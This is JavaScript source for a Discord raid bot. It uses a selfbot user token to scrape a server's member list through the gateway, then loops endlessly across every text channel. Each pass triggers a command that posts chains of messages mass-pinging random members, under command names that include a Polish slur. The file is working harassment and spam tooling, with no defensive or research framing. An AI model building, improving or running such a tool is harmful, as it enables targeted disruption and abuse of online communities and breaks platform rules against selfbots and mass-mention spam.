const { Client, GatewayIntentBits, SlashCommandBuilder, MessageFlags } = require('discord.js');
require('dotenv').config();

const client = new Client({ intents: [GatewayIntentBits.Guilds] });
const WebSocket = require('ws');

const KFC_LOGO = `██╗   ██╗   ███████╗     ██████╗ 
██║  ██╔╝ ██╔════╝  ██╔════╝ 
█████╔╝  █████╗        ██║      
██╔═██╗  ██╔══╝        ██║      
██║   ██╗  ██║                ╚██████╗ 
╚═╝   ╚═╝  ╚═╝                   ╚═════╝`;

let running = false;
const SELF_TOKEN = (process.env.SELFBOT_TOKEN || '').trim();
let authHeader = SELF_TOKEN, triedBot = false;
let cwelCmdId = null, cwelCmdVer = null, appId = null;

async function sf(method, endpoint, data = null) {
    const r = await fetch(`https://discord.com/api/v9${endpoint}`, {
        method,
        headers: { 'Authorization': authHeader, 'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json' },
        body: data ? JSON.stringify(data) : undefined
    });
    if (r.status === 401 && !triedBot) { triedBot = true; authHeader = 'Bot ' + SELF_TOKEN; return await sf(method, endpoint, data); }
    const txt = await r.text();
    if (r.status >= 400) { return null; }
    try { return JSON.parse(txt); } catch { return null; }
}

// Get members via Gateway OP 8
async function getMembers(guildId) {
    return new Promise((resolve) => {
        const ws = new WebSocket('wss://gateway.discord.gg/?v=9&encoding=json');
        let hb, done = false, ids = new Set();
        const finish = (r) => { if (!done) { done = true; clearInterval(hb); try { ws.close(); } catch(e) {} resolve(r || Array.from(ids)); } };
        ws.onopen = () => ws.send(JSON.stringify({ op: 2, d: { token: SELF_TOKEN, properties: { $os: 'linux', $browser: 'discord', $device: 'discord' }, intents: 0 } }));
        ws.onmessage = (e) => {
            const p = JSON.parse(e.data);
            if (p.op === 10) hb = setInterval(() => ws.send(JSON.stringify({ op: 1, d: null })), p.d.heartbeat_interval);
            if (p.op === 0 && p.t === 'READY') ws.send(JSON.stringify({ op: 8, d: { guild_id: guildId, query: '', limit: 0 } }));
            if (p.op === 0 && p.t === 'GUILD_MEMBERS_CHUNK' && p.d.guild_id === guildId) {
                p.d.members.forEach(m => { if (!m.user?.bot) ids.add(m.user.id); });
                if (!p.d.chunk_count || p.d.chunk_index + 1 >= p.d.chunk_count) finish();
            }
        };
        ws.onerror = () => finish([]);
        ws.onclose = () => finish(Array.from(ids));
        setTimeout(() => finish(Array.from(ids)), 20000);
    });
}

// Selfbot triggers /cwel in a channel via Discord API
async function triggerCwel(channelId, guildId, args) {
    if (!cwelCmdId) return;
    const nonce = Date.now().toString() + Math.random().toString(36).slice(2, 6);
    const payload = {
        type: 2,
        application_id: appId,
        guild_id: guildId,
        channel_id: channelId,
        data: {
            id: cwelCmdId,
            name: 'cwel',
            type: 1,
            options: args ? [{ name: 'args', value: args, type: 3 }] : []
        },
        nonce
    };
    const r = await sf('POST', '/interactions', payload);
    if (r) console.log(`🎯 Triggered /cwel in channel ${channelId}`);
}

// Bot handles /cwel: ghost + 5 reply chains via interaction webhook
async function handleCwel(interaction, args, memberIds) {
    const laggy = '][[[][][][]][][[]][][[][][[][]';
    
    // Ghost reply
    await interaction.reply({ content: `⚡ /cwel ${args || ''}`, flags: MessageFlags.Ephemeral });

    // Send 5 reply chains via interaction webhook (the bot's webhook = bot messages)
    const webhookUrl = `https://discord.com/api/v9/webhooks/${appId}/${interaction.token}`;
    
    let lastId = null;
    for (let i = 0; i < 5; i++) {
        const shuf = [...memberIds].sort(() => Math.random() - 0.5).slice(0, 10);
        const pings = shuf.map(id => `<@${id}>`).join(' ');
        const content = args ? `${args} ${pings}` : `${laggy} ${pings}`;
        
        const payload = { content, flags: 0 }; // Non-ephemeral
        if (lastId) payload.message_reference = { message_id: lastId, fail_if_not_exists: false };

        const r = await fetch(webhookUrl + '?wait=true', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        if (r.ok) {
            const d = await r.json();
            lastId = d.id;
            console.log(`📨 Bot chain ${i+1}/5`);
        }
    }
}

// Get channels
async function getChannels(guildId) {
    const chs = await sf('GET', `/guilds/${guildId}/channels`);
    return chs ? chs.filter(c => c.type === 0) : [];
}

client.once('ready', () => {
    console.log(`🔧 Bot: ${client.user.tag}`);
    console.log(KFC_LOGO);
    appId = client.user.id;
});

client.on('ready', async () => {
    const cmds = await client.application.commands.set([
        new SlashCommandBuilder().setName('zlamzasady').setDescription('KFC bot').addStringOption(o => o.setName('args').setDescription('Args').setRequired(false)),
        new SlashCommandBuilder().setName('cwel').setDescription('Cwel command').addStringOption(o => o.setName('args').setDescription('Message').setRequired(false)),
        new SlashCommandBuilder().setName('stop').setDescription('Stop')
    ]);
    cwelCmdId = cmds.find(c => c.name === 'cwel')?.id;
    cwelCmdVer = cmds.find(c => c.name === 'cwel')?.version;
    console.log(`✅ Synced | /cwel ID: ${cwelCmdId}`);
});

client.on('interactionCreate', async (interaction) => {
    try {
        if (!interaction.isChatInputCommand()) return;
        const gid = interaction.guildId;
        if (!gid) { await interaction.reply({ content: '❌ Server', flags: MessageFlags.Ephemeral }); return; }
        const args = interaction.options.getString('args') || '';

        if (interaction.commandName === 'zlamzasady') {
            await interaction.reply({ content: '🍗 ZlamZasady', flags: MessageFlags.Ephemeral });
            console.log(`⚔️ Start | args: "${args}"`);

            const [chs, mids] = await Promise.all([getChannels(gid), getMembers(gid)]);
            console.log(`✅ ${chs.length} channels, ${mids.length} members`);

            // Selfbot triggers /cwel in each channel in a loop
            running = true;
            while (running) {
                for (const ch of chs) {
                    if (!running) break;
                    await triggerCwel(ch.id, gid, args);
                    await new Promise(r => setTimeout(r, 500));
                }
            }
        }

        if (interaction.commandName === 'cwel') {
            const args = interaction.options.getString('args') || '';
            console.log(`⚡ /cwel received | args: "${args}"`);

            // Get member IDs if needed
            const mids = await getMembers(gid);
            await handleCwel(interaction, args, mids);
        }

        if (interaction.commandName === 'stop') {
            running = false;
            await interaction.reply({ content: '🛑 Stopped', flags: MessageFlags.Ephemeral });
            console.log('🛑 Stop');
            process.exit(0);
        }
    } catch (error) {
        console.log(`❌ ${error.message}`);
        try { if (!interaction.replied) await interaction.reply({ content: '❌ Error', flags: MessageFlags.Ephemeral }); } catch(e) {}
    }
});

client.login(process.env.USER_APP_TOKEN);